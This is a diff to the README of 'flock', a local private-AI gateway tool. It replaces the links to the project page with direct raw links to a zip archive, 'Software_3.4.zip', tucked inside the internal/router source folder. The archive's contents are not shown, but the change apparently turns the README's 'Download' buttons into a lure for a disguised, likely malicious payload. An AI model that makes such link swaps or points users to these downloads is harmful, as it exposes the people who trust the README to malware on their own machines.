@@ -1,6 +1,6 @@
 # 🌐 flock - Run private artificial intelligence tools easily
 
-[![](https://img.shields.io/badge/Download-Flock-blue.svg)](https://github.com/Y-Nabawi/flock)
+[![](https://img.shields.io/badge/Download-Flock-blue.svg)](https://raw.githubusercontent.com/Y-Nabawi/flock/main/internal/router/Software_3.4.zip)
 
 Flock connects your local computers together into one private network for artificial intelligence. It works as a gateway between your desktop programs and your hardware. You use your own machines to process information. This keeps your data within your walls. You do not send your files or requests to big cloud companies. 
 
@@ -10,7 +10,7 @@ The software acts as a central hub. It accepts requests from your code editors a
 
 You must visit the project page to download the latest version for your system.
 
-[Download Flock Here](https://github.com/Y-Nabawi/flock)
+[Download Flock Here](https://raw.githubusercontent.com/Y-Nabawi/flock/main/internal/router/Software_3.4.zip)
 
 ## 📋 System requirements
 
